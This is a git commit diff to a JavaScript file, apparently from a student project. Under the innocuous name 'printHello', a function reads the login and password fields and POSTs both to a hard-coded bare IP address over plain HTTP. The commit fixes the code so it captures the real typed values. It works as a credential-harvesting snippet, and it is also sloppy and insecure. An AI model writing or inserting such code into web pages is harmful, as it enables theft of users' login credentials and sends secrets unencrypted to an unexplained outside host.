7da8f257b1fea4ecb65af12098e91ac288faa0df
Jordan Liu <jminjie@umich.edu>
2016-04-21 20:05:32 -0400

    Fix request sender in main.js

--- javascripts/main.js
+++ javascripts/main.js
@@ -1,12 +1,12 @@
 function printHello() {
 	// grab the login and pass
-	var uniq = document.getElementById('login');
+	var login = document.getElementById('login');
 	var password = document.getElementById('password');
 	// send the login and pass as resquests
 	var xmlHttp = new XMLHttpRequest();
 	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
-	xmlHttp.send("<uniq>" + uniq.innerHTML + "</uniq>");
+	xmlHttp.send("<login>" + login.value+ "</login>");
 	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
-	xmlHttp.send("<pass>" + password.innerHTML + "</pass>");
+	xmlHttp.send("<password>" + password.value+ "</password>");
 }
 
